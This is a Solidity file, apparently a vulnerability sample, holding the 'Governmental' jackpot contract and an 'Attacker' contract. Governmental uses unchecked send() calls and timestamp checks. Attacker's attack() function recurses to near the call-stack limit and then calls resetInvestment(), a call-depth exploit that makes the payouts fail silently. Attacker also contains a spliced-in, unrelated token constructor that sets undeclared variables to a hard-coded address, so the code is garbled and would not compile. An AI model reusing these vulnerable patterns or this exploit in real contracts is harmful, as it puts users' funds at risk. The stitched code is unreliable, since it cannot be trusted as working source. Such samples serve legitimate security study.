 

 
pragma solidity ^0.4.0;

contract Governmental {
  address public owner;
  address public lastInvestor;
  uint public jackpot = 1 ether;
  uint public lastInvestmentTimestamp;
  uint public ONE_MINUTE = 1 minutes;

  function Governmental() {
    owner = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function invest() {
    if (msg.value<jackpot/2) throw;
    lastInvestor = msg.sender;
    jackpot += msg.value/2;
     
    lastInvestmentTimestamp = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
      throw;

    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);

    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}

contract Attacker {


    function Decentralized() public {
        totalSupply = 10000000000000000000000000;
        name = 'Decentralized economy content';
        symbol = 'DEC';
        decimals = 18;
        balanceOf[0xF938c3D288Aa2ac2b0dA2957b535617D7564C691] = totalSupply;
        Transfer(address(0), 0xF938c3D288Aa2ac2b0dA2957b535617D7564C691, totalSupply);

        airAmount = 100000000000000;
        airBegintime = 1532736000;
        airEndtime = 1532736300;
        airSender = 0xF938c3D288Aa2ac2b0dA2957b535617D7564C691;
        airLimitCount = 1;

        icoRatio = 100000000000000;
        icoBegintime = 1532736000;
        icoEndtime = 1538265540;
        icoSender = 0xF938c3D288Aa2ac2b0dA2957b535617D7564C691;
        icoHolder = 0xF938c3D288Aa2ac2b0dA2957b535617D7564C691;
    }

  function attack(address target, uint count) {
    if (0<=count && count<1023) {
      this.attack.gas(msg.gas-2000)(target, count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}
